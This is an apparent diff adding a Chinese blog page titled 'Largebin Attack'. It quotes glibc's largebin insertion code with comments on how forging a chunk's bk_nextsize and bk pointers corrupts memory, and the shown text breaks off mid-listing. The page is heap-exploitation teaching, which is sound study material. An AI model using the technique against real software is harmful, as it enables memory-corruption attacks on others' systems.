@@ -1,0 +1,1106 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="https://blog.csdn.net/Mr_Fmnwon/article/details/142330217\nhttps://blog.csdn.net/2302_79542511/article/details/141200902\n先放一张largebin结构图 源码分析 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 if (in_smallbin_range(size)) { victim_index = smallbin_index(size); bck = bin_at(av, victim_index); fwd = bck-&gt;fd; } //下面那个else开始是largebin的插入 else { victim_index = largebin_index(size);// 获取对应 bin 的头节点 bck = bin_at(av, victim_index); // 获取 bin 中的第一个 chunk fwd = bck-&gt;fd; if (fwd != bck) { size |= PREV_INUSE; assert((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == 0); if ((unsigned long) (size) &lt; (unsigned long) (bck-&gt;bk-&gt;size)) { &#39;&#39;&#39; 第一种情况，比最小的小 &#39;&#39;&#39; fwd = bck; bck = bck-&gt;bk; victim-&gt;fd_nextsize = fwd-&gt;fd; victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize; fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim; } else { &#39;&#39;&#39;第二种遍历找位置&#39;&#39;&#39; assert((fwd-&gt;size &amp; NON_MAIN_ARENA) == 0); while ((unsigned long) size &lt; fwd-&gt;size) { fwd = fwd-&gt;fd_nextsize; assert((fwd-&gt;size &amp; NON_MAIN_ARENA) == 0); } if ((unsigned long) size == (unsigned long) fwd-&gt;size) fwd = fwd-&gt;fd; else { &#39;&#39;&#39;如果fwd-&gt;bk_nextsize被提前构造那victim-&gt;bk_nextsize会被改&#39;&#39;&#39; //fwd此时指向第一个比victim小的chunk victim-&gt;fd_nextsize = fwd; victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize; fwd-&gt;bk_nextsize = victim; victim-&gt;bk_nextsize-&gt;fd_nextsize = victim; } bck = fwd-&gt;bk; } } else victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim; } mark_bin(av, victim_index); &#39;&#39;&#39;这里通上 ，提前构造fwd-&gt;bk&#39;&#39;&#39; victim-&gt;bk = bck; victim-&gt;fd = fwd; fwd-&gt;bk = victim; bck-&gt;fd = victim; 插入chunk比最小的大 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 while ((unsigned long) size &lt; fwd-&gt;size) { fwd = fwd-&gt;fd_nextsize; assert((fwd-&gt;size &amp; NON_MAIN_ARENA) == 0); } if ((unsigned long) size == (unsigned long) fwd-&gt;size) fwd = fwd-&gt;fd; else { &#39;&#39;&#39;如果fwd-&gt;bk_nextsize被提前构造那victim-&gt;bk_nextsize会被改&#39;&#39;&#39; //fwd此时指向第一个比victim小的chunk victim-&gt;fd_nextsize = fwd; victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize; fwd-&gt;bk_nextsize = victim; victim-&gt;bk_nextsize-&gt;fd_nextsize = victim; } 此时fwd指向比victim小的最大chunk,我们提前修改fwd的bk_nextsize的话\n">
+<title>Largebin Attack</title>
+
+<link rel='canonical' href='http://localhost:1313/p/largebin-attack/'>
+
+<link rel="stylesheet" href="/scss/style.min.84466b97fc2839f50008967839ac7e52db98eefba6b8d2a771a97db8f36059e7.css"><meta property='og:title' content="Largebin Attack">
+<meta property='og:description' content="https://blog.csdn.net/Mr_Fmnwon/article/details/142330217\nhttps://blog.csdn.net/2302_79542511/article/details/141200902\n先放一张largebin结构图 源码分析 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 if (in_smallbin_range(size)) { victim_index = smallbin_index(size); bck = bin_at(av, victim_index); fwd = bck-&gt;fd; } //下面那个else开始是largebin的插入 else { victim_index = largebin_index(size);// 获取对应 bin 的头节点 bck = bin_at(av, victim_index); // 获取 bin 中的第一个 chunk fwd = bck-&gt;fd; if (fwd != bck) { size |= PREV_INUSE; assert((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == 0); if ((unsigned long) (size) &lt; (unsigned long) (bck-&gt;bk-&gt;size)) { &#39;&#39;&#39; 第一种情况，比最小的小 &#39;&#39;&#39; fwd = bck; bck = bck-&gt;bk; victim-&gt;fd_nextsize = fwd-&gt;fd; victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize; fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim; } else { &#39;&#39;&#39;第二种遍历找位置&#39;&#39;&#39; assert((fwd-&gt;size &amp; NON_MAIN_ARENA) == 0); while ((unsigned long) size &lt; fwd-&gt;size) { fwd = fwd-&gt;fd_nextsize; assert((fwd-&gt;size &amp; NON_MAIN_ARENA) == 0); } if ((unsigned long) size == (unsigned long) fwd-&gt;size) fwd = fwd-&gt;fd; else { &#39;&#39;&#39;如果fwd-&gt;bk_nextsize被提前构造那victim-&gt;bk_nextsize会被改&#39;&#39;&#39; //fwd此时指向第一个比victim小的chunk victim-&gt;fd_nextsize = fwd; victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize; fwd-&gt;bk_nextsize = victim; victim-&gt;bk_nextsize-&gt;fd_nextsize = victim; } bck = fwd-&gt;bk; } } else victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim; } mark_bin(av, victim_index); &#39;&#39;&#39;这里通上 ，提前构造fwd-&gt;bk&#39;&#39;&#39; victim-&gt;bk = bck; victim-&gt;fd = fwd; fwd-&gt;bk = victim; bck-&gt;fd = victim; 插入chunk比最小的大 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 while ((unsigned long) size &lt; fwd-&gt;size) { fwd = fwd-&gt;fd_nextsize; assert((fwd-&gt;size &amp; NON_MAIN_ARENA) == 0); } if ((unsigned long) size == (unsigned long) fwd-&gt;size) fwd = fwd-&gt;fd; else { &#39;&#39;&#39;如果fwd-&gt;bk_nextsize被提前构造那victim-&gt;bk_nextsize会被改&#39;&#39;&#39; //fwd此时指向第一个比victim小的chunk victim-&gt;fd_nextsize = fwd; victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize; fwd-&gt;bk_nextsize = victim; victim-&gt;bk_nextsize-&gt;fd_nextsize = victim; } 此时fwd指向比victim小的最大chunk,我们提前修改fwd的bk_nextsize的话\n">
+<meta property='og:url' content='http://localhost:1313/p/largebin-attack/'>
+<meta property='og:site_name' content='fuguang&#39;s storys'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='pwn' /><meta property='article:published_time' content='2026-03-17T22:28:28&#43;08:00'/><meta property='article:modified_time' content='2026-03-17T22:28:28&#43;08:00'/><meta property='og:image' content='http://localhost:1313/image/Largebin/Largebin_attack.jpg' />
+<meta name="twitter:title" content="Largebin Attack">
+<meta name="twitter:description" content="https://blog.csdn.net/Mr_Fmnwon/article/details/142330217\nhttps://blog.csdn.net/2302_79542511/article/details/141200902\n先放一张largebin结构图 源码分析 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 if (in_smallbin_range(size)) { victim_index = smallbin_index(size); bck = bin_at(av, victim_index); fwd = bck-&gt;fd; } //下面那个else开始是largebin的插入 else { victim_index = largebin_index(size);// 获取对应 bin 的头节点 bck = bin_at(av, victim_index); // 获取 bin 中的第一个 chunk fwd = bck-&gt;fd; if (fwd != bck) { size |= PREV_INUSE; assert((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == 0); if ((unsigned long) (size) &lt; (unsigned long) (bck-&gt;bk-&gt;size)) { &#39;&#39;&#39; 第一种情况，比最小的小 &#39;&#39;&#39; fwd = bck; bck = bck-&gt;bk; victim-&gt;fd_nextsize = fwd-&gt;fd; victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize; fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim; } else { &#39;&#39;&#39;第二种遍历找位置&#39;&#39;&#39; assert((fwd-&gt;size &amp; NON_MAIN_ARENA) == 0); while ((unsigned long) size &lt; fwd-&gt;size) { fwd = fwd-&gt;fd_nextsize; assert((fwd-&gt;size &amp; NON_MAIN_ARENA) == 0); } if ((unsigned long) size == (unsigned long) fwd-&gt;size) fwd = fwd-&gt;fd; else { &#39;&#39;&#39;如果fwd-&gt;bk_nextsize被提前构造那victim-&gt;bk_nextsize会被改&#39;&#39;&#39; //fwd此时指向第一个比victim小的chunk victim-&gt;fd_nextsize = fwd; victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize; fwd-&gt;bk_nextsize = victim; victim-&gt;bk_nextsize-&gt;fd_nextsize = victim; } bck = fwd-&gt;bk; } } else victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim; } mark_bin(av, victim_index); &#39;&#39;&#39;这里通上 ，提前构造fwd-&gt;bk&#39;&#39;&#39; victim-&gt;bk = bck; victim-&gt;fd = fwd; fwd-&gt;bk = victim; bck-&gt;fd = victim; 插入chunk比最小的大 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 while ((unsigned long) size &lt; fwd-&gt;size) { fwd = fwd-&gt;fd_nextsize; assert((fwd-&gt;size &amp; NON_MAIN_ARENA) == 0); } if ((unsigned long) size == (unsigned long) fwd-&gt;size) fwd = fwd-&gt;fd; else { &#39;&#39;&#39;如果fwd-&gt;bk_nextsize被提前构造那victim-&gt;bk_nextsize会被改&#39;&#39;&#39; //fwd此时指向第一个比victim小的chunk victim-&gt;fd_nextsize = fwd; victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize; fwd-&gt;bk_nextsize = victim; victim-&gt;bk_nextsize-&gt;fd_nextsize = victim; } 此时fwd指向比victim小的最大chunk,我们提前修改fwd的bk_nextsize的话\n"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='http://localhost:1313/image/Largebin/Largebin_attack.jpg' />
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu_c17c68125d7ac105.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🍥</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">fuguang&#39;s storys</a></h1>
+            <h2 class="site-description">Welcome ~</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://github.com/fu9-dotom/fu9-dotom.github.io'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>归档</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/links/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>Links</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#源码分析">源码分析</a>
+      <ol>
+        <li><a href="#插入chunk比最小的大">插入chunk比最小的大</a></li>
+        <li><a href="#插入chunk比最小chunk还小">插入chunk比最小chunk还小</a></li>
+      </ol>
+    </li>
+    <li><a href="#how2heap-demo">how2heap demo</a></li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/largebin-attack/">
+                
+                    <img src="/image/Largebin/Largebin_attack.jpg" loading="lazy" alt="Featured image of post Largebin Attack" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/pwn/" style="background-color: #2a9d8f; color: #fff;">
+                Pwn
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/largebin-attack/">Largebin Attack</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Mar 17, 2026</time>
+            </div>
+        
+
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <p><a class="link" href="https://blog.csdn.net/Mr_Fmnwon/article/details/142330217"  target="_blank" rel="noopener"
+    >https://blog.csdn.net/Mr_Fmnwon/article/details/142330217</a></p>
+<p><a class="link" href="https://blog.csdn.net/2302_79542511/article/details/141200902"  target="_blank" rel="noopener"
+    >https://blog.csdn.net/2302_79542511/article/details/141200902</a></p>
+<p>先放一张largebin结构图
+<img src="/image/Largebin/bins.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="bins"
+	
+	
+></p>
+<h2 id="源码分析">源码分析
+</h2><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nf">in_smallbin_range</span><span class="p">(</span><span class="n">size</span><span class="p">))</span> 
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">victim_index</span> <span class="o">=</span> <span class="nf">smallbin_index</span><span class="p">(</span><span class="n">size</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">bck</span> <span class="o">=</span> <span class="nf">bin_at</span><span class="p">(</span><span class="n">av</span><span class="p">,</span> <span class="n">victim_index</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">fwd</span> <span class="o">=</span> <span class="n">bck</span><span class="o">-&gt;</span><span class="n">fd</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="c1">//下面那个else开始是largebin的插入
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">else</span> 
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">victim_index</span> <span class="o">=</span> <span class="nf">largebin_index</span><span class="p">(</span><span class="n">size</span><span class="p">);</span><span class="c1">// 获取对应 bin 的头节点
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">bck</span> <span class="o">=</span> <span class="nf">bin_at</span><span class="p">(</span><span class="n">av</span><span class="p">,</span> <span class="n">victim_index</span><span class="p">);</span>   <span class="c1">// 获取 bin 中的第一个 chunk
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">fwd</span> <span class="o">=</span> <span class="n">bck</span><span class="o">-&gt;</span><span class="n">fd</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">fwd</span> <span class="o">!=</span> <span class="n">bck</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">size</span> <span class="o">|=</span> <span class="n">PREV_INUSE</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">assert</span><span class="p">((</span><span class="n">bck</span><span class="o">-&gt;</span><span class="n">bk</span><span class="o">-&gt;</span><span class="n">size</span> <span class="o">&amp;</span> <span class="n">NON_MAIN_ARENA</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">((</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span> <span class="p">(</span><span class="n">size</span><span class="p">)</span> <span class="o">&lt;</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span> <span class="p">(</span><span class="n">bck</span><span class="o">-&gt;</span><span class="n">bk</span><span class="o">-&gt;</span><span class="n">size</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="err">&#39;&#39;&#39;</span>
+</span></span><span class="line"><span class="cl">                <span class="err">第一种情况，比最小的小</span>
+</span></span><span class="line"><span class="cl">                <span class="err">&#39;&#39;&#39;</span>
+</span></span><span class="line"><span class="cl">                <span class="n">fwd</span> <span class="o">=</span> <span class="n">bck</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="n">bck</span> <span class="o">=</span> <span class="n">bck</span><span class="o">-&gt;</span><span class="n">bk</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="n">victim</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span> <span class="o">=</span> <span class="n">fwd</span><span class="o">-&gt;</span><span class="n">fd</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="n">victim</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span> <span class="o">=</span> <span class="n">fwd</span><span class="o">-&gt;</span><span class="n">fd</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="n">fwd</span><span class="o">-&gt;</span><span class="n">fd</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span> <span class="o">=</span> <span class="n">victim</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span> <span class="o">=</span> <span class="n">victim</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="p">}</span> 
+</span></span><span class="line"><span class="cl">        <span class="k">else</span> 
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="err">&#39;&#39;&#39;第二种遍历找位置&#39;&#39;&#39;</span>
+</span></span><span class="line"><span class="cl">                <span class="nf">assert</span><span class="p">((</span><span class="n">fwd</span><span class="o">-&gt;</span><span class="n">size</span> <span class="o">&amp;</span> <span class="n">NON_MAIN_ARENA</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="k">while</span> <span class="p">((</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span> <span class="n">size</span> <span class="o">&lt;</span> <span class="n">fwd</span><span class="o">-&gt;</span><span class="n">size</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="n">fwd</span> <span class="o">=</span> <span class="n">fwd</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                <span class="nf">assert</span><span class="p">((</span><span class="n">fwd</span><span class="o">-&gt;</span><span class="n">size</span> <span class="o">&amp;</span> <span class="n">NON_MAIN_ARENA</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">((</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span> <span class="n">size</span> <span class="o">==</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span> <span class="n">fwd</span><span class="o">-&gt;</span><span class="n">size</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="n">fwd</span> <span class="o">=</span> <span class="n">fwd</span><span class="o">-&gt;</span><span class="n">fd</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl">            <span class="k">else</span> 
+</span></span><span class="line"><span class="cl">            <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="err">&#39;&#39;&#39;如果</span><span class="n">fwd</span><span class="o">-&gt;</span><span class="n">bk_nextsize被提前构造那victim</span><span class="o">-&gt;</span><span class="n">bk_nextsize会被改</span><span class="err">&#39;&#39;&#39;</span>
+</span></span><span class="line"><span class="cl">                    <span class="c1">//fwd此时指向第一个比victim小的chunk
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="n">victim</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span> <span class="o">=</span> <span class="n">fwd</span><span class="p">;</span>
